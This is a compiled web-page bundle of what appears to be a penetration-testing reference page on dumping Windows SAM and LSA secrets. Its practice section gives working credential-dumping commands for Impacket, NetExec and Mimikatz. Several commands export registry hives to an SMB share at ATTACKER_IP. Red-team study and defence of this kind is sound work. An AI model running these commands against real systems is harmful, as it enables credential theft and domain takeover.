import{_ as k,c as d,a5 as n,G as a,w as t,j as s,a as i,B as r,o as p}from"./chunks/framework.B5CpDqM0.js";const f=JSON.parse('{"title":"SAM & LSA secrets","description":"MITRE ATT&CK™ Sub-techniques T1003.002, T1003.004 and T1003.005","frontmatter":{"description":"MITRE ATT&CK™ Sub-techniques T1003.002, T1003.004 and T1003.005","authors":"ShutdownRepo, mpgn, p0dalirius, sckdev"},"headers":[],"relativePath":"ad/movement/credentials/dumping/sam-and-lsa-secrets.md","filePath":"ad/movement/credentials/dumping/sam-and-lsa-secrets.md","lastUpdated":1724982529000}'),o={name:"ad/movement/credentials/dumping/sam-and-lsa-secrets.md"};function c(g,e,F,m,y,u){const h=r("PluginTabsTab"),l=r("PluginTabs");return p(),d("div",null,[e[6]||(e[6]=n('<h1 id="sam-lsa-secrets" tabindex="-1">SAM &amp; LSA secrets <a class="header-anchor" href="#sam-lsa-secrets" aria-label="Permalink to &quot;SAM &amp; LSA secrets&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>In Windows environments, passwords are stored in a hashed format in registry hives like SAM (Security Account Manager) and SECURITY.</p><table tabindex="0"><thead><tr><th>Hive</th><th>Details</th><th>Format or credential material</th></tr></thead><tbody><tr><td>SAM</td><td>stores locally cached credentials (referred to as SAM secrets)</td><td>LM or NT hashes</td></tr><tr><td>SECURITY</td><td>stores domain cached credentials (referred to as LSA secrets)</td><td>Plaintext passwords, LM or NT hashes, Kerberos keys (DES, AES), Domain Cached Credentials (DCC1 and DCC2), Security Questions (<code>L$</code><em><code>SQSA</code></em><code>&lt;SID&gt;</code>),</td></tr><tr><td>SYSTEM</td><td>contains enough info to decrypt SAM secrets and LSA secrets</td><td>N/A</td></tr></tbody></table><p>SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format.</p><table tabindex="0"><thead><tr><th>Credential material</th><th>Subsequent attacks</th></tr></thead><tbody><tr><td>Plaintext passwords</td><td><a href="./../bruteforcing/spraying">credential spraying</a>, <a href="./../bruteforcing/stuffing">stuffing</a>, <a href="./../shuffling">shuffling</a> or <a href="./../../kerberos/forged-tickets/">silver tickets</a></td></tr><tr><td>LM and NT hashes</td><td><a href="./../bruteforcing/spraying">credential spraying</a>, <a href="./../bruteforcing/stuffing">stuffing</a>, <a href="./../shuffling">shuffling</a>, <a href="./../cracking">cracking</a>, <a href="./../../ntlm/pth">pass-the-hash</a></td></tr><tr><td>Kerberos keys (RC4, i.e. == NT hash)</td><td><a href="./../cracking">credential cracking</a>, <a href="./../../kerberos/ptk">overpass-the-hash</a> or <a href="./../../kerberos/forged-tickets/">silver tickets</a></td></tr><tr><td>Kerberos keys (DES, AES)</td><td><a href="./../cracking">credential cracking</a>, <a href="./../../kerberos/ptk">pass-the-key</a> or <a href="./../../kerberos/forged-tickets/">silver tickets</a></td></tr><tr><td>Domain Cached Credentials (DCC1 or DCC2)</td><td><a href="./../cracking">credential cracking</a></td></tr></tbody></table><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="exfiltration" tabindex="-1">Exfiltration <a class="header-anchor" href="#exfiltration" aria-label="Permalink to &quot;Exfiltration&quot;">​</a></h3>',8)),a(l,null,{default:t(()=>[a(h,{label:"UNIX-like"},{default:t(()=>e[0]||(e[0]=[s("p",null,[s("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a "),s("a",{href:"./../../builtins/security-groups"},"Backup Operator"),i(" member to a Domain Admin by dumping a Domain Controller's secrets and use them for a "),s("a",{href:"./dcsync"},"DCSync"),i(".")],-1),s("div",{class:"tip custom-block"},[s("p",null,"The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# start an SMB share")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"smbserver.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "someshare"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "./"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# save each hive manually")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"/"user":"password"@"target"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -keyName"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'HKLM\\SAM'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\ATTACKER_IPs\\someshare'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"/"user":"password"@"target"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -keyName"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'HKLM\\SYSTEM'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\ATTACKER_IP\\someshare'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"/"user":"password"@"target"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -keyName"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'HKLM\\SECURITY'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\ATTACKER_IP\\someshare'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# backup all SAM, SYSTEM and SECURITY hives at once")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"/"user":"password"@"target"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," backup"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '\\\\ATTACKER_IP\\someshare'")])])])],-1)])),_:1}),a(h,{label:"Live Windows"},{default:t(()=>e[1]||(e[1]=[s("p",null,[i("When the Windows operating system is running, the hives are in use and mounted. The command-line tool named "),s("code",null,"reg"),i(" can be used to export them.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," HKLM"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\S"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"AM"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "C:\\Windows\\Temp\\sam.save"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," HKLM"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\S"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"ECURITY"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "C:\\Windows\\Temp\\security.save"')]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"reg"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," save"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," HKLM"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\S"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"YSTEM"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "C:\\Windows\\Temp\\system.save"')])])])],-1),s("p",null,[i("This operation can be conducted remotely with "),s("a",{href:"https://github.com/mpgn/BackupOperatorToDA",target:"_blank",rel:"noreferrer"},"BackupOperatoToDA"),i(" (C++).")],-1),s("div",{class:"tip custom-block"},[s("p",null,"The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"BackupOperatorToDA.exe"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "password"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -o"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\\\"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'ATTACKER_IP\\someshare"')])])])],-1),s("div",{class:"tip custom-block"},[s("p",null,[i("Alternatively, from a live Windows machine, the hive files can also be exfiltrated using "),s("a",{href:"./ntds#volume-shadow-copy-vssadmin"},"Volume Shadow Copy"),i(" like demonstrated for an NTDS export.")])],-1)])),_:1}),a(h,{label:"Down Windows"},{default:t(()=>e[2]||(e[2]=[s("p",null,"When Windows is not running, the hives are not mounted and they can be copied just like any other file. This can be operated when mounting the hard drive from another OS (e.g. when booting the computer on another operating system). The hive files can be found at the following locations.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"\\system32\\config\\sam")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"\\system32\\config\\security")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"\\system32\\config\\system")])])])],-1)])),_:1})]),_:1}),e[7]||(e[7]=s("h3",{id:"secrets-dump",tabindex:"-1"},[i("Secrets dump "),s("a",{class:"header-anchor",href:"#secrets-dump","aria-label":'Permalink to "Secrets dump"'},"​")],-1)),e[8]||(e[8]=s("p",null,"Here are some examples and tools that can be used for local/remote/offline dumping.",-1)),a(l,null,{default:t(()=>[a(h,{label:"secretsdump"},{default:t(()=>e[3]||(e[3]=[s("p",null,[s("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",target:"_blank",rel:"noreferrer"},"secretsdump"),i(" (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like "),s("a",{href:"./../../ntlm/pth"},"pass-the-hash"),i(" (LM/NTLM), or "),s("a",{href:"./../../kerberos/ptt"},"pass-the-ticket"),i(" (Kerberos).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM & LSA secrets")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER:PASSWORD@TARGET'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM & LSA secrets (pass-the-hash)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'LMhash:NThash'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM & LSA secrets (pass-the-ticket)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN/USER@TARGET'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Offline dumping of LSA secrets from exported hives")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -security"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/security.save'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -system"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/system.save'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," LOCAL")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Offline dumping of SAM secrets from exported hives")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sam"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/sam.save'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -system"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/system.save'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," LOCAL")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Offline dumping of SAM & LSA secrets from exported hives")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"secretsdump.py"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sam"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/sam.save'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -security"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/security.save'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -system"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '/path/to/system.save'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," LOCAL")])])])],-1)])),_:1}),a(h,{label:"netexec"},{default:t(()=>e[4]||(e[4]=[s("p",null,[s("a",{href:"https://github.com/Pennyw0rth/NetExec",target:"_blank",rel:"noreferrer"},"NetExec"),i(" (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like "),s("a",{href:"./../../ntlm/pth"},"pass-the-hash"),i(" (NTLM), or "),s("a",{href:"./../../kerberos/ptt"},"pass-the-ticket"),i(" (Kerberos)")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM/LSA secrets")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--sam/--lsa")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM/LSA secrets (local user authentication)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--local-auth"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--sam/--lsa")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM/LSA secrets (pass-the-hash)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-d"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-H"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $NThash "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--sam/--lsa")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Remote dumping of SAM/LSA secrets (pass-the-ticket)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"netexec"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," smb"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGETS "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--kerberos"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --sam/--lsa")])])])],-1)])),_:1}),a(h,{label:"Mimikatz"},{default:t(()=>e[5]||(e[5]=[s("p",null,[s("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),i(" can be used locally with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/sam",target:"_blank",rel:"noreferrer"},[s("code",null,"lsadump::sam")]),i(" and "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets",target:"_blank",rel:"noreferrer"},[s("code",null,"lsadump::secrets")]),i(" to extract credentials from "),s("code",null,"SAM"),i(" and "),s("code",null,"SECURITY"),i(" registry hives (and "),s("code",null,"SYSTEM"),i(" for the encryption keys), or offline with hive dumps.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Local dumping of SAM secrets on the target")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::sam")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Offline dumping of SAM secrets from exported hives")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::sam"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /sam:'C:\\path\\to\\sam.save'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /system:'C:\\path\\to\\system.save'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Local dumping of LSA secrets on the target")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::secrets")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Offline dumping LSA secrets from exported hives")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::secrets"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /security:'C:\\path\\to\\security.save'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /system:'C:\\path\\to\\system.save'")])])])],-1)])),_:1})]),_:1}),e[9]||(e[9]=n('<div class="tip custom-block"><p>Secretsdump (Impacket) and NetExec both extract security questions, if any, from the LSA. They are json formatted, UTF-16-LE encoded, and hex encoded on top of that.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="http://moyix.blogspot.com/2008/02/syskey-and-sam.html" target="_blank" rel="noreferrer">http://moyix.blogspot.com/2008/02/syskey-and-sam.html</a></p><p><a href="http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html" target="_blank" rel="noreferrer">http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html</a></p><p><a href="https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b" target="_blank" rel="noreferrer">https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b</a></p><p><a href="https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/" target="_blank" rel="noreferrer">https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/</a></p>',6))])}const b=k(o,[["render",c]]);export{f as __pageData,b as default};
